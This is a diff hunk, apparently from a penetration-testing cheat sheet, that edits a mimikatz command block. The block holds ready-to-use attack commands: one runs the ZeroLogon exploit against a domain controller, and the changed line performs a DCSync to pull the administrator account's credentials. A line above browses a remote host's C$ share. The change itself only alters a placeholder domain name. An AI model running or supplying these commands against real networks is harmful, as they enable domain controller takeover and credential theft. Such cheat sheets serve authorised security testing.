@@ -5093,7 +5093,7 @@ dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 
 ```c
 "lsadump::zerologon /target:IP /account:DC_NAME$ /exploit" exit //exploit
-"lsadump::dcsync /domain:DOMAIN_NAME /user:administrator /authuser:DC_NAME$ /authdomain:main /authpassword:"" /authntlm" exit
+"lsadump::dcsync /domain:DOMAIN_NAME.yzx /user:administrator /authuser:DC_NAME$ /authdomain:main /authpassword:"" /authntlm" exit
 ```
 
 #### NetExec
